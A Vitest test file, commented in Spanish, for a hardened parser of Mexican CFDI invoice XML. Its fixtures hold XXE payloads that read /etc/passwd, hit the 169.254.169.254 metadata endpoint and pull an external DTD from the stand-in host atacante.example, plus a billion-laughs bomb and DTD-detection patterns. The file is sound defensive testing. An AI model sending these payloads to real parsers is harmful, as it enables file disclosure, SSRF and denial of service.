import { describe, it, expect } from 'vitest';
import { leerCfdiSeguro, validarXmlEntrante, declaraDtd, MAX_XML_BYTES } from './xml_seguro';

// ═══════════════════════════════════════════════════════════════════════════
// XML BAJO ATAQUE: XXE (entidad externa → file:// o http://), billion laughs,
// DTD parametrizados, codificaciones raras y archivos que dicen ser XML. El
// criterio no es «el parser no resolvió la entidad» sino «ni siquiera se parseó».
// ═══════════════════════════════════════════════════════════════════════════

const UUID = 'AAAAAAAA-BBBB-4CCC-8DDD-EEEEEEEEEEEE';
const cfdi = (extra = '', descripcion = 'Refacciones') => `<?xml version="1.0" encoding="UTF-8"?>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4" xmlns:tfd="http://www.sat.gob.mx/TimbreFiscalDigital" Version="4.0" Fecha="2026-09-30T10:00:00" SubTotal="1000.00" Total="1160.00" TipoDeComprobante="I">
  ${extra}
  <cfdi:Emisor Rfc="AAA010101AAA" Nombre="Taller SA"/>
  <cfdi:Receptor Rfc="BBB010101BBB"/>
  <cfdi:Conceptos><cfdi:Concepto ClaveProdServ="78181500" ClaveUnidad="E48" Cantidad="1" Descripcion="${descripcion}" Importe="1000.00"/></cfdi:Conceptos>
  <cfdi:Impuestos><cfdi:Traslados><cfdi:Traslado Impuesto="002" Importe="160.00"/></cfdi:Traslados></cfdi:Impuestos>
  <cfdi:Complemento><tfd:TimbreFiscalDigital UUID="${UUID}"/></cfdi:Complemento>
</cfdi:Comprobante>`;

describe('el camino sano', () => {
  it('un CFDI normal se lee con su UUID, total y RFC', () => {
    const r = leerCfdiSeguro(Buffer.from(cfdi()));
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.cfdi.uuid).toBe(UUID.toLowerCase());
      expect(r.cfdi.total).toBe(1160);
      expect(r.cfdi.rfcEmisor).toBe('AAA010101AAA');
    }
  });
  it('acepta BOM UTF-8 y la declaración latin1', () => {
    const conBom = Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(cfdi())]);
    expect(leerCfdiSeguro(conBom).ok).toBe(true);
    const latin = Buffer.from(cfdi('', 'Niño').replace('UTF-8', 'ISO-8859-1'), 'latin1');
    expect(leerCfdiSeguro(latin).ok).toBe(true);
  });
});

describe('ADVERSARIAL — XXE y entidades', () => {
  it('XXE clásico (file:///etc/passwd en una entidad externa) se rechaza ANTES de parsear', () => {
    const malo = `<?xml version="1.0"?>\n<!DOCTYPE c [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n` + cfdi('', '&xxe;').replace(/^<\?xml[^>]*>\s*/, '');
    const r = leerCfdiSeguro(Buffer.from(malo));
    expect(r).toEqual({ ok: false, motivo: 'dtd' });
  });

  it('XXE por RED (SSRF a un servicio interno o a un colector del atacante)', () => {
    const malo = `<?xml version="1.0"?><!DOCTYPE c [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>${cfdi('', '&xxe;').replace(/^<\?xml[^>]*>\s*/, '')}`;
    expect(leerCfdiSeguro(Buffer.from(malo))).toEqual({ ok: false, motivo: 'dtd' });
  });

  it('entidad PARAMÉTRICA con DTD externo (exfiltración fuera de banda)', () => {
    const malo = `<?xml version="1.0"?><!DOCTYPE c [<!ENTITY % remoto SYSTEM "http://atacante.example/x.dtd"> %remoto;]>${cfdi()}`;
    expect(leerCfdiSeguro(Buffer.from(malo)).ok).toBe(false);
  });

  it('«billion laughs» (entidades internas anidadas) se rechaza sin expandir', () => {
    const risas = '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>';
    const inicio = Date.now();
    const r = leerCfdiSeguro(Buffer.from(`<?xml version="1.0"?>${risas}${cfdi('', '&lol3;').replace(/^<\?xml[^>]*>\s*/, '')}`));
    expect(r).toEqual({ ok: false, motivo: 'dtd' });
    expect(Date.now() - inicio).toBeLessThan(100);
  });

  it('las variantes de mayúsculas, espacios y atributos del DTD también se atrapan', () => {
    for (const d of ['<!doctype x>', '<!DocType  x [ ]>', '<! DOCTYPE x>', '<!ENTITY a "b">', '<!ELEMENT a ANY>', '<!ATTLIST a b CDATA #IMPLIED>', '<!NOTATION n SYSTEM "x">']) {
      expect(declaraDtd(d), d).toBe(true);
      expect(leerCfdiSeguro(Buffer.from(`<?xml version="1.0"?>${d}${cfdi()}`)).ok, d).toBe(false);
    }
    expect(declaraDtd('<cfdi:Comprobante Descripcion="entidad &amp; algo"/>')).toBe(false);
  });

  it('un DTD escondido dentro de un comentario o CDATA también se rechaza (falla cerrado: nunca hay DTD legítimo)', () => {
    expect(leerCfdiSeguro(Buffer.from(cfdi('<!-- <!DOCTYPE x> -->'))).ok).toBe(false);
  });
});

describe('ADVERSARIAL — forma del archivo', () => {
  it('un XML de más de 4 MB se rechaza sin parsearlo', () => {
    const grande = Buffer.alloc(MAX_XML_BYTES + 1, 0x20);
    expect(leerCfdiSeguro(grande)).toEqual({ ok: false, motivo: 'demasiado_grande' });
  });
  it('vacío, UTF-16, bytes nulos y codificaciones no soportadas', () => {
    expect(leerCfdiSeguro(Buffer.alloc(0))).toEqual({ ok: false, motivo: 'vacio' });
    expect(leerCfdiSeguro(Buffer.from('﻿<a/>', 'utf16le'))).toEqual({ ok: false, motivo: 'codificacion' });
    expect(leerCfdiSeguro(Buffer.from('<?xml version="1.0"?>\0<a/>'))).toEqual({ ok: false, motivo: 'codificacion' });
    expect(leerCfdiSeguro(Buffer.from('<?xml version="1.0" encoding="UTF-16"?><a/>'))).toEqual({ ok: false, motivo: 'codificacion' });
  });
  it('un PDF, un ejecutable o texto plano renombrados a .xml no son XML', () => {
    expect(validarXmlEntrante(Buffer.from('%PDF-1.4 ...'))).toEqual({ ok: false, motivo: 'no_es_xml' });
    expect(validarXmlEntrante(Buffer.from('hola, soy una factura'))).toEqual({ ok: false, motivo: 'no_es_xml' });
  });
  it('un XML válido que NO es un CFDI (no trae Comprobante) se dice no_es_cfdi', () => {
    expect(leerCfdiSeguro(Buffer.from('<?xml version="1.0"?><nota><a>1</a></nota>'))).toEqual({ ok: false, motivo: 'no_es_cfdi' });
  });
  it('XML malformado o anidado a profundidad absurda no lanza', () => {
    expect(() => leerCfdiSeguro(Buffer.from('<?xml version="1.0"?><a><b>'))).not.toThrow();
    expect(() => leerCfdiSeguro(Buffer.from(`<?xml version="1.0"?>${'<a>'.repeat(50_000)}`))).not.toThrow();
  });
});
